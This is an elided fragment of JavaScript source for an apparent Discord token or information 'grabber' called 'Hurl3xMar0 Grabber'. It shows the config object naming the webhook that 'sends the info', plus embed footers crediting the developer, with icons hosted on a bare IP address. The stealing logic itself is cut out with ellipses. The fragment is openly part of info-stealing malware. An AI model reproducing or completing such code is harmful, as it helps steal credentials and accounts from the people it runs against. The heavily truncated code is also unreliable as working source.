...
const config = {
  ...
  embed_name: 'Hurl3xMar0 Grabber', //name of the webhook thats gonna send the info
  embed_icon: '217.182.38.7/xd.jpg'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
    ...
    embeds: [
      {
        ...
        footer: {
          text: 'Requested from Bilal | Developed By Hurl3xMar0',
          icon: 'http://217.182.38.7/xd.jpg'
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        footer: {
          text: 'Requested from Bilal | Developed By Hurl3xMar0',
          icon_url: 'http://217.182.38.7/xd.jpg' ,
        },
      },
    ],
  };
